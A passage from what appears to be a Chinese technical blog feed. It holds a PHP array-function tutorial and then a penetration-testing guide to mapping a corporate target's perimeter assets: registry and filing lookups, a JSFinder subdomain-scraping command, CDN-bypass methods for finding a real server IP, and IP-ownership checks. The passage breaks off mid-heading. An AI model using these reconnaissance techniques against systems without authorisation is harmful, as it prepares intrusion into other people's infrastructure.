class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure><h3 id="GLOBAL变量：-GLOBALS"><a href="#GLOBAL变量：-GLOBALS" class="headerlink" title="GLOBAL变量：$GLOBALS"></a>GLOBAL变量：$GLOBALS</h3><p>获取全局参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020110607.png" alt="image"></p><h2 id="数组的相关处理函数"><a href="#数组的相关处理函数" class="headerlink" title="数组的相关处理函数"></a>数组的相关处理函数</h2><h3 id="数组的键-值操作函数"><a href="#数组的键-值操作函数" class="headerlink" title="数组的键/值操作函数"></a>数组的键/值操作函数</h3><ul><li><code>array_values</code>：返回数组中所有的值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   $a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);</span><br><span class="line">$values &#x3D; array_values($a);</span><br><span class="line">var_dump($values); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;array(3)&#123;[0]&#x3D;&gt;string(4)&quot;张三&quot;  [1]&#x3D;&gt;int(20)  [2]&#x3D;&gt;string(2)&quot;男&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><code>array_keys</code>：返回数组中所有的键名  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);</span><br><span class="line">$keys &#x3D; array_keys($a);</span><br><span class="line">for($i&#x3D;0;$i&lt;count($keys);$i++)&#123;</span><br><span class="line">echo $keys[$i].&quot;&amp;nbsp;&quot;;  &#x2F;&#x2F;name age sex </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><code>in_array</code>：检查数组中是否存在某个值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);</span><br><span class="line">if(in_array(&quot;张三&quot;,$a))&#123;</span><br><span class="line">    echo &quot; ‘张三’在\$a数组中&quot;;   &#x2F;&#x2F;”张三“在$a数组中</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>array_flip</code>：交换数组中的键和值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);  </span><br><span class="line">$b &#x3D; array_flip($a);</span><br><span class="line">foreach($b as $k&#x3D;&gt;$v)&#123;  </span><br><span class="line">    echo &quot;$k&#x3D;&gt;$v&quot;;  &#x2F;&#x2F; 张三&#x3D;&gt;name 20&#x3D;&gt;age 男&#x3D;&gt;sex </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>array_reverse</code>：返回一个单元顺序相反的数组  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);  </span><br><span class="line">$b &#x3D; array_reverse($a);</span><br><span class="line">foreach($b as $k&#x3D;&gt;$v)&#123;  </span><br><span class="line">    echo &quot;$k&#x3D;&gt;$v&quot;;  &#x2F;&#x2F; sex&#x3D;&gt;男 age&#x3D;&gt;20 name&#x3D;&gt;张三 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="统计数组元素的个数与唯一性"><a href="#统计数组元素的个数与唯一性" class="headerlink" title="统计数组元素的个数与唯一性"></a>统计数组元素的个数与唯一性</h3>定义一个数组：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; [1,2,3,4,5,6,6,7,8,4];</span><br></pre></td></tr></table></figure></li><li><code>count</code>：统计数组的长度  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(count($a));</span><br><span class="line">&#x2F;&#x2F;输出int(10)</span><br></pre></td></tr></table></figure></li><li><code>array_count_values</code>：统计数组中所有的值出现的次数  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(array_count_values($a));</span><br><span class="line">&#x2F;&#x2F;输出array(8) &#123; [1]&#x3D;&gt; int(1) [2]&#x3D;&gt; int(1) [3]&#x3D;&gt; int(1) [4]&#x3D;&gt; int(2) [5]&#x3D;&gt; int(1) [6]&#x3D;&gt; int(2) [7]&#x3D;&gt; int(1) [8]&#x3D;&gt; int(1) &#125;</span><br></pre></td></tr></table></figure></li><li><code>array_unique</code>：数组去重  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(array_unique($a));</span><br><span class="line">&#x2F;&#x2F;输出array(8) &#123; [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; int(2) [2]&#x3D;&gt; int(3) [3]&#x3D;&gt; int(4) [4]&#x3D;&gt; int(5) [5]&#x3D;&gt; int(6) [7]&#x3D;&gt; int(7) [8]&#x3D;&gt; int(8) &#125;</span><br></pre></td></tr></table></figure><h3 id="使用回调函数处理数组的函数"><a href="#使用回调函数处理数组的函数" class="headerlink" title="使用回调函数处理数组的函数"></a>使用回调函数处理数组的函数</h3>定义一个数组：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; [1,2,3,4,5,6,6,7,8,4];</span><br></pre></td></tr></table></figure></li><li><code>array_filter</code>：用回调函数过滤数组中的单元，键值保持不变  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   var_dump(array_filter($a,&#39;test&#39;));</span><br><span class="line">function test($id)&#123;</span><br><span class="line">if($id &#x3D;&#x3D; 4)&#123;&#x2F;&#x2F;只保留值为4的</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">return false;</span><br><span class="line">var_dump(func_get_args());</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;输出array(2) &#123; [3]&#x3D;&gt; int(4) [9]&#x3D;&gt; int(4) &#125;</span><br></pre></td></tr></table></figure></li><li><code>array_walk</code>：对数组中的每个成员应用用户函数  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function myfunction(&amp;$value,$key)</span><br><span class="line">&#123;</span><br><span class="line">$value&#x3D;&quot;yellow&quot;;    &#x2F;&#x2F;将数组a的所有值改为yellow</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;array(&quot;a&quot;&#x3D;&gt;&quot;red&quot;,&quot;b&quot;&#x3D;&gt;&quot;green&quot;,&quot;c&quot;&#x3D;&gt;&quot;blue&quot;);</span><br><span class="line">array_walk($a,&quot;myfunction&quot;);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(3) &#123; [&quot;a&quot;]&#x3D;&gt; string(6) &quot;yellow&quot; [&quot;b&quot;]&#x3D;&gt; string(6) &quot;yellow&quot; [&quot;c&quot;]&#x3D;&gt; string(6) &quot;yellow&quot; &#125;</span><br></pre></td></tr></table></figure></li><li><code>array_map</code>：将函数作用到数组中的每个值上，并返回带有新值的数组  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   function myfunction($v)</span><br><span class="line">&#123;</span><br><span class="line">  return($v*$v);    &#x2F;&#x2F;每个值都乘以本身</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;array(1,2,3,4,5);</span><br><span class="line">var_dump(array_map(&quot;myfunction&quot;,$a));</span><br><span class="line">&#x2F;&#x2F;返回array(5) &#123; [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; int(4) [2]&#x3D;&gt; int(9) [3]&#x3D;&gt; int(16) [4]&#x3D;&gt; int(25) &#125;</span><br></pre></td></tr></table></figure><h3 id="数组的排序函数"><a href="#数组的排序函数" class="headerlink" title="数组的排序函数"></a>数组的排序函数</h3></li><li><code>sort</code>：对数组排序(升序)</li><li><code>rsort</code>：对数组逆向排序（降序）</li><li><code>usort</code>：使用用户自定义的比较函数对数组中的值进行排序</li><li><code>asort</code>：对数组进行排序并保持索引关系（关联数组排序）</li><li><code>arsort</code>：对数组进行逆向排序并保持索引关系 </li><li><code>uasort</code>：用户自定义的比较函数对数组进行排序并保持索引关联</li><li><code>ksort</code>：对数组按照键名排序</li><li><code>krsort</code>：对数组按照键名逆向排序</li><li><code>uksort</code>：使用用户自定义的比较函数对数组中的键名进行排序</li><li><code>natsort</code>：用“自然排序”算法对数组排序</li><li><code>natcasesort</code>：用“自然排序”算法对数组不区分大小写字母排序 </li><li><code>array_multisort</code>：对多个数组或多维数组进行排序</li></ul><h3 id="拆分、合并、分解与结合数组"><a href="#拆分、合并、分解与结合数组" class="headerlink" title="拆分、合并、分解与结合数组"></a>拆分、合并、分解与结合数组</h3><ul><li><p><code>array_splice</code>：把数组中的一部分去掉并用其它值取代</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   $a &#x3D; [1,2,3,4,5,6,6,7,8,4]; &#x2F;&#x2F;定义一个数组a</span><br><span class="line">   array_splice($a,0,5,[10]);  &#x2F;&#x2F;把数组下标从0-5的所有值去掉替换为10</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(6) &#123; [0]&#x3D;&gt; int(10) [1]&#x3D;&gt; int(6) [2]&#x3D;&gt; int(6) [3]&#x3D;&gt; int(7) [4]&#x3D;&gt; int(8) [5]&#x3D;&gt; int(4) &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>array_combine</code>：创建一个数组，用一个数组的值作为其键名，另一个数组的值作为其值</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$k &#x3D; [&#39;key1&#39;,&#39;key2&#39;];</span><br><span class="line">$v &#x3D; [&#39;value1&#39;,&#39;value2&#39;];</span><br><span class="line">$a &#x3D; array_combine($k,$v);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(2) &#123; [&quot;key1&quot;]&#x3D;&gt; string(6) &quot;value1&quot; [&quot;key2&quot;]&#x3D;&gt; string(6) &quot;value2&quot; &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>array_merge</code>：将一个或多个数组的单元合并起来，一个数组中的值附加在前一个数组的后面。返回作为结果的数组。</p><blockquote><p>如果输入的数组中有相同的字符串键名，则该键名后面的值将覆盖前一个值。然而，如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。如果只给了一个数组并且该数组是数字索引的，则键名会以连续方式重新索引。 </p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   $k &#x3D; [&#39;key1&#39;,&#39;key2&#39;];</span><br><span class="line">$v &#x3D; [&#39;value1&#39;,&#39;value2&#39;];</span><br><span class="line">$a &#x3D; array_merge($k,$v);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(4) &#123; [0]&#x3D;&gt; string(4) &quot;key1&quot; [1]&#x3D;&gt; string(4) &quot;key2&quot; [2]&#x3D;&gt; string(6) &quot;value1&quot; [3]&#x3D;&gt; string(6) &quot;value2&quot; &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>array_intersect</code>：计算数组的交集，返回一个数组，该数组包含了所有在 array1 中也同时出现在所有其它参数数组中的值。注意键名保留不变。</p></li><li><p><code>array_diff</code>：计算数组的差集，返回一个数组，该数组包括了所有在 array1 中但是不在任何其它参数数组中的值。注意键名保留不变。</p></li></ul><h3 id="数组与数据结构"><a href="#数组与数据结构" class="headerlink" title="数组与数据结构"></a>数组与数据结构</h3><p>定义一个数组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; [1,2,3,4,5,6,6,7,8,4];</span><br></pre></td></tr></table></figure><ul><li><code>array_pop</code>：将数组最后一个单元弹出（出栈）  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   $a &#x3D; array_pop($a);</span><br><span class="line">var_dump($a);   &#x2F;&#x2F;输出int(4)</span><br></pre></td></tr></table></figure></li><li><code>array_push</code>：将一个或多个单元压入数组的末尾（入栈）  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   array_push($a,10);  &#x2F;&#x2F;将10插入数组末尾</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(11) &#123; [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; int(2) [2]&#x3D;&gt; int(3) [3]&#x3D;&gt; int(4) [4]&#x3D;&gt; int(5) [5]&#x3D;&gt; int(6) [6]&#x3D;&gt; int(6) [7]&#x3D;&gt; int(7) [8]&#x3D;&gt; int(8) [9]&#x3D;&gt; int(4) [10]&#x3D;&gt; int(10) &#125;</span><br></pre></td></tr></table></figure></li><li><code>array_shift</code>：将数组开头的单元移出数组</li><li><code>array_unshift</code>：在数组开头插入一个或多个单元</li></ul><h3 id="其他有用的数组处理函数"><a href="#其他有用的数组处理函数" class="headerlink" title="其他有用的数组处理函数"></a>其他有用的数组处理函数</h3><ul><li><code>array_rand</code>：从数组中随机取出一个或多个单元  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   $a &#x3D; array_rand($a);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;随机输出一个数组a的值，每次刷新基本值都会变</span><br></pre></td></tr></table></figure></li><li><code>shuffle</code>：将数组打乱  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   shuffle($a);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;数组打乱输出</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;数组的概述&quot;&gt;&lt;a href=&quot;#数组的概述&quot; class=&quot;headerlink&quot; title=&quot;数组的概述&quot;&gt;&lt;/a&gt;数组的概述&lt;/h2&gt;&lt;p&gt;&lt;code&gt;PHP&lt;/code&gt;中的数组实际上是一个有序图。图是一种把 &lt;code&gt;values&lt;/code&gt; 映射到 &lt;code&gt;keys&lt;/code&gt; 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组来使用，或列表（矢量），散列表（是图的一种实现），字典，集合，队列以及更多可能性。因为可以用另一个 &lt;code&gt;PHP&lt;/code&gt; 数组作为值，也可以很容易地模拟树。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;数组下标&lt;/strong&gt;：可以视为资料内容在此数组中的识别名称，通常被称为数组下标。&lt;/li&gt;
&lt;li&gt;当&lt;strong&gt;索引值为数值&lt;/strong&gt;时，也代表此资料内容在数组中的储存位置。&lt;/li&gt;
&lt;li&gt;数组中有几个索引值就被称为几维数组。&lt;/li&gt;
&lt;li&gt;数据分类：在PHP中有两种数组，&lt;strong&gt;索引数组&lt;/strong&gt;和&lt;strong&gt;关联数组&lt;/strong&gt;。&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;索引（indexed）数组&lt;/strong&gt;的索引值是整数，以0开始。当通过位置来标识东西时用索引数组。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关联（associative）数组&lt;/strong&gt;以字符串做为索引值，关联数组更像操作表。索引值为列名，用于访问列的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;数组的定义&quot;&gt;&lt;a href=&quot;#数组的定义&quot; class=&quot;headerlink&quot; title=&quot;数组的定义&quot;&gt;&lt;/a&gt;数组的定义&lt;/h2&gt;&lt;p&gt;由于 &lt;code&gt;PHP&lt;/code&gt; 是属于弱类型数据，因此源代码中的数组并不需要经过特别的声明操作，直接将一组数值指定给某一数组元素即可。一般情况下数组的赋值有三种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接赋值方式如：  &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$a[0]&amp;#x3D;&amp;#39;spam@126.com&amp;#39;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$a[1]&amp;#x3D;&amp;#39;abuse@sohu.com&amp;#39;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;array&lt;/code&gt;函数如：  &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$a&amp;#x3D;array(&amp;quot;spam@126.com&amp;quot;,&amp;quot;abuse@sohu.com&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;[]&lt;/code&gt;如：  &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$a&amp;#x3D;[&amp;quot;spam@126.com&amp;quot;,&amp;quot;abuse@sohu.com&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;直接赋值的方式声明数组&quot;&gt;&lt;a href=&quot;#直接赋值的方式声明数组&quot; class=&quot;headerlink&quot; title=&quot;直接赋值的方式声明数组&quot;&gt;&lt;/a&gt;直接赋值的方式声明数组&lt;/h3&gt;基本格式：&lt;code&gt;$数组变量名[索引值]=资料内容&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中&lt;strong&gt;索引值（下标）可以是一个字符串或一个整数&lt;/strong&gt;。等价于整数（不以0开头）的字符串值被当作整数对待。因此，数组&lt;code&gt;$array[3]&lt;/code&gt;与&lt;code&gt;$array[&amp;#39;3&amp;#39;]&lt;/code&gt;是引用相同的元素。但是&lt;code&gt;$array[&amp;#39;03&amp;#39;]&lt;/code&gt;引用的另外不同的元素。&lt;/p&gt;
&lt;h4 id=&quot;示例1：&quot;&gt;&lt;a href=&quot;#示例1：&quot; class=&quot;headerlink&quot; title=&quot;示例1：&quot;&gt;&lt;/a&gt;示例1：&lt;/h4&gt;&lt;p&gt;分别定义两个数组&lt;code&gt;$a&lt;/code&gt;和&lt;code&gt;$b&lt;/code&gt;，看看区别：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$a[0]&amp;#x3D;1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$a[1]&amp;#x3D;2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$a[2]&amp;#x3D;3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$b[]&amp;#x3D;1;     &amp;#x2F;&amp;#x2F;不定义下标默认从0开始&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$b[]&amp;#x3D;2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$b[]&amp;#x3D;3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$b[6]&amp;#x3D;4;    &amp;#x2F;&amp;#x2F;定义下标为6的值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$b[]&amp;#x3D;5;     &amp;#x2F;&amp;#x2F;后面的顺延下标为7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var_dump($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	echo &amp;quot;&amp;lt;br&amp;gt;---------------&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var_dump($b);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="PHP基础" scheme="https://hzktester.top/categories/PHP%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="PHP基础" scheme="https://hzktester.top/tags/PHP%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>边界资产信息搜集</title>
    <link href="https://hzktester.top/posts/e0d0a34b.html"/>
    <id>https://hzktester.top/posts/e0d0a34b.html</id>
    <published>2020-11-05T08:12:00.000Z</published>
    <updated>2020-11-20T02:34:05.251Z</updated>
    
    <content type="html"><![CDATA[<p>当有一个很大的集团目标时，一般的信息搜集流程如下：</p><h1 id="集团结构："><a href="#集团结构：" class="headerlink" title="集团结构："></a>集团结构：</h1><p>主要提取出历史网站备案，域名、子公司域名、备案号、注册邮箱（邮箱@后的也可能是域名）、手机号。</p><ul><li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li></ul><h2 id="备案号查同备案的网站"><a href="#备案号查同备案的网站" class="headerlink" title="备案号查同备案的网站"></a>备案号查同备案的网站</h2><ul><li><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">https://beian.miit.gov.cn/#/Integrated/recordQuery</a></p><p>  <img src="https://qiniu.hzktester.top/tp2020110906.png" alt="image"></p></li></ul><h2 id="主域名中的跳转链接、JS中的链接搜集"><a href="#主域名中的跳转链接、JS中的链接搜集" class="headerlink" title="主域名中的跳转链接、JS中的链接搜集"></a>主域名中的跳转链接、JS中的链接搜集</h2><p>集团结构信息搜集后一般会得到主域名，也就是官网信息，可能有很多跳转链接，也属于他的资产，包括JS中的链接。推荐使用这个工具进行提取：</p><ul><li>jsfinder（扫API和子域名）：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.baidu.com -d -ou mi_url.txt -os mi_subdomain.txt</span><br></pre></td></tr></table></figure></li></ul><h1 id="深挖更多IP资产："><a href="#深挖更多IP资产：" class="headerlink" title="深挖更多IP资产："></a>深挖更多IP资产：</h1><h2 id="CDN："><a href="#CDN：" class="headerlink" title="CDN："></a>CDN：</h2><h4 id="根据域名查是否有CDN："><a href="#根据域名查是否有CDN：" class="headerlink" title="根据域名查是否有CDN："></a>根据域名查是否有CDN：</h4><ul><li><p>多地<code>ping</code>：<a href="https://tools.ipip.net/httphead.php">https://tools.ipip.net/httphead.php</a>。如果返回都是一样的IP那就没有CDN</p></li><li><p><code>Nslookup</code>：Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN</p><p>  <img src="https://qiniu.hzktester.top/tp2020110907.png" alt="image"></p></li></ul><h4 id="CDN绕过找到真实IP："><a href="#CDN绕过找到真实IP：" class="headerlink" title="CDN绕过找到真实IP："></a>CDN绕过找到真实IP：</h4><ul><li>全球<code>ping</code>：<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a>（针对小厂CDN，国外访问可能获得真实IP）</li><li>注册查看邮件原文</li><li>历史解析：<ul><li><code>DNSdumpster</code>（在线）：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li><li>历史<code>DNS</code>记录：<a href="https://rapiddns.io/subdomain">https://rapiddns.io/subdomain</a></li></ul></li><li>配置不当<ul><li><code>phpinfo</code></li><li>站点同时支持<code>http</code>和<code>https</code>访问，<code>CDN</code>只配置 <code>https</code>协议，那么这时访问<code>http</code>就可以轻易绕过。</li><li>其他信息泄露、<code>git</code>、<code>svn</code>源码</li></ul></li><li>通过找到的子域名辅助查找真实IP</li><li>查询<code>https</code>证书：<a href="https://censys.io/ipv4">https://censys.io/ipv4</a></li></ul><h4 id="确认是否为真实IP："><a href="#确认是否为真实IP：" class="headerlink" title="确认是否为真实IP："></a>确认是否为真实IP：</h4><ul><li>直接访问IP和访问域名的结果是一样的。</li></ul><h2 id="IP资产证明："><a href="#IP资产证明：" class="headerlink" title="IP资产证明："></a>IP资产证明：</h2><p>当拿到很多IP之后，如何确定是不是目标的资产？</p><ul><li>查IP归属：<a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a>（如果查到是阿里云或者腾讯云的基本可以放弃）</li><li>网站logo</li><li>网站底部版权声明</li></ul><h2 id="批量扫描"><a href="#批量扫描" class="headerlink" 